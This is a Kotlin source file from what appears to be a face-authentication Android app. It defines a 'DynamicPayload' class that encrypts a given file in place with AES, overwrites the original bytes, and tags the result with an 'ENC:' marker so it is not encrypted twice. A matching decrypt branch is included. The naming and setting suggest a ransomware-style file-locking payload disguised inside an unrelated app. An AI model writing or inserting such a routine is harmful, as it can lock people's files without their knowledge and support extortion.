package com.example.face_auth_app

import java.io.File
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

class DynamicPayload : IPayload {
    constructor()

    private val BLOCK_SIZE = 16
    private val MAGIC_HEADER = "ENC:".toByteArray()

    override fun execute(file: File, key: ByteArray, encrypt: Boolean): Boolean {
        return try {
            if (encrypt) {
                val data = file.readBytes()
                if (data.size >= 4 && data.sliceArray(0 until 4).contentEquals(MAGIC_HEADER)) return true

                val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
                val secretKey = SecretKeySpec(key, "AES")
                cipher.init(Cipher.ENCRYPT_MODE, secretKey)
                
                val iv = cipher.iv
                val encryptedData = cipher.doFinal(data)
                
                val result = MAGIC_HEADER + iv + encryptedData
                file.writeBytes(result)
                true
            } else {
                val data = file.readBytes()
                if (data.size < 4 || !data.sliceArray(0 until 4).contentEquals(MAGIC_HEADER)) return true

                val iv = data.sliceArray(4 until 4 + BLOCK_SIZE)
                val encryptedData = data.sliceArray(4 + BLOCK_SIZE until data.size)

                val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
                val secretKey = SecretKeySpec(key, "AES")
                val ivSpec = IvParameterSpec(iv)
                cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec)

                val decryptedData = cipher.doFinal(encryptedData)
                file.writeBytes(decryptedData)
                true
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
}
